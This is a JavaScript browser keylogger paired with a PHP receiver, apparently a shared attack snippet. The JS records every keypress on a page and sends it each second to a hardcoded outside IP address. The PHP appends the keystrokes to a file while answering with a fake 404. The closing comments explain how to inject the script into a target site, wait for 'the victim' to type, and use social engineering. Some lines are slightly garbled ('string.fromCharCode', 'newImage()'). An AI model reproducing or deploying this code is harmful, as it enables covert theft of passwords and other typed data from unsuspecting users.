let keys = '';
let url = 'http://206.130.110.212/forum/system/keylogger.php?c='
document.onkeypress = function(e) {
    get = window.event ? event : e;
    key = get.keyCode ? get.keyCode : get.charCode;
    key = string.fromCharCode(key);
    keys += key;
}
window.setInterval(function() {
    if (keys.length > 0) {
        newImage().src = url + keys;
        keys = '';
    }
}, 1000);

// Remember to name your js File keylogger.js same with your PHP file.
// Here is the PHP code:


/* <?php 
header ( $ _SERVER [ "SERVER_PROTOCOL" ]. " 404 Not Found" ,  true ,  404 ); 
header ( 'Access-Control-Allow-Methods: GET, REQUEST, OPTIONS' ); 
header ( 'Access-Control-Allow-Credentials: true' ); 
header ( 'Access-Control-Allow-Origin: *' ); 
header ( 'Access-Control-Allow-Headers: Content-Type, *' ); 
$ file  =  'data.txt' ; 
if ( isset ( $ _REQUEST [ 'c' ]) && ! empty ( $ _REQUEST [ 'c' ])) 
{ 
         file_put_contents ( $ file ,  $ _REQUEST [ 'c' ],  FILE_APPEND ); 
         printf ( "LOGGED!" ); 
} 
?>
*/

// now create a text file called data.txt to save collected key logs.
// Change url variable in keylogger.js to url address where keylogger.php is located
// load keylogger.js in the DOM of the attacked application
// put keylogger.php and data.txt to your server where you have data write access (don't forget to set pertinent file privileges.
// When  you're done, just let the victim come to attacked website with javascript allowed in the browser and type something.
// Social engineering might be helpful here
// Access Dom/Js